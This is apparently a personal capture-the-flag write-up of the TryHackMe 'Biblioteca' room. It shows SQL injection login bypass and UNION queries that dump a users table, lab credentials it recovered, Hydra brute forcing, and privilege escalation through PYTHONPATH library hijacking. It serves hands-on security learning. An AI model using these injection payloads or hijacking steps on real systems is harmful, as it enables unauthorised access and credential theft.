# Biblioteca Helped-Through

Name: Biblioteca
Date:  10/01/2023
Difficulty:  Medium
Goals:  
- Warm up brain after work
- Have fun
- Fundementals
Learnt:
Beyond Root:
- Explain the OSI model for each layer a aspect of how the machine works and if there is no active aspect I must interact with the box on a layer that the box does intentional want external interaction 
- Caveat One do not look at the [THM](https://tryhackme.com/room/osimodelzi)
	- Write what I think the OSI model is
	- Check and correct myself
	- Then test myself with the room.

Fundementals are important and warming up and having fun while prepping for arduious Hacking and Learning later. I thought I would start evening with another newbie tuesday from [Alh4zr3d](https://www.youtube.com/watch?v=Uz4iv7kHxpI). Also I need to finished patching [[Agent-T-Writeup]] and this might prompt it to occur and swiftly. Also I need to exercise and finish [[Bucket-Helped-Through]] before going on a massive Azure related educative spree. 0xTiberious and H3l3N_0F_t0r join the stream along with all the regulars.

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Biblioteca/Screenshots/ping.png)

I register a user but it did not provide much functionality. I tried command inject, sqli but got: 
![](whileupsetabouttopgun.png)
`admin'1' OR '1'='1'-- -`, because I assumed the you would store usernames as strings for some reason...but it instead want `admin' OR 1=1-- -`

![](butitlikeregular.png)

Awhile got my One punchman straight 100s in minus the 10k.  
![](hydrasmokey.png)

## Exploit

3416 tries probably not the intended path. Al mentions sqlmap, which I seem to hardwired out of my brain as OSCP does not allow SQLmap.
![](sqlmapoutput.png)

Given the current state of the cold viruses these days and desperately trying to continue on regardless, I return again to this machine more excited about manual SQL injection.

![](1stsqli.png)

Because it is using the 2nd field of the return of the query to display information we can ask the database for all the information we need like - database version
![](2ndsqli.png)
What Database we are in:
![](3rdsqli.png)

This next query got me:
```sql
SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'-- -
```

![](thissqligotmetoo.png)
As like Al was also think that the query in that section of the query will all need to be together between comma when the FROM statement has to go after the fields that SELECT is selecting. Now we want column names:
```sql
UNION SELECT 1,group_concat(table_name, columns_name),3,4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'-- -
```

![](sqlicolumns.png)
```sql
usersemail,usersid,userspassword,userusername
```

Now to extract passwords

```sql
UNION SELECT 1,group_concat(username,':' password),3,4 FROM users-- -
```

![](smokeyPassword.png)
I am very surpised that `smokey:My_P@ssW0rd123` that that is not in rockyou.txt. Beware the additional examation marks.


## Foothold

![](smokeyfoothold.png)

And there is two PrivEsc we need to do:
![](hazelishere.png)
Looking for all owned files for smokey
![](smokeysapp.png)
the script contains hardcoded credentials
![](appscript.png)
`$tr0nG_P@sS!` for mysql, Al stilll talking about SQLi
![](localsqldatabase.png)
But it is just the database with the table used to get in and su-ing twith password reuse does not work. The mald is real `hazel:hazel`

![](realmald.png)
## PrivEsc

![](hasherpythonscript.png)

![](setenvtheenv.png)
[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv) has this:
![](hacktrickstotherescue.png)
Spoilers for [[Admirer-Writeup]] I suppose..
- Script imports hashlib
- Create reverse shell in /dev/shm called hashlib
- Point PYTHONPATH to /dev/shm

![](root.png)

## Beyond Root

OSI model, Raw Sockets, ICMP

- Ping has  raw sockets in Linux 
![](getcapping.png)
```bash 
getcap OTHER
```

```powershell
getcap variant
```

This is my third time writing this up.

Apply a Presentation of a Session Transporting Network Data through Physical cables. 

1. Physical
2. Data
3. Network
4. Transport - Mixed up
5. Session - Mixed Up
6. Presentation
7. Application
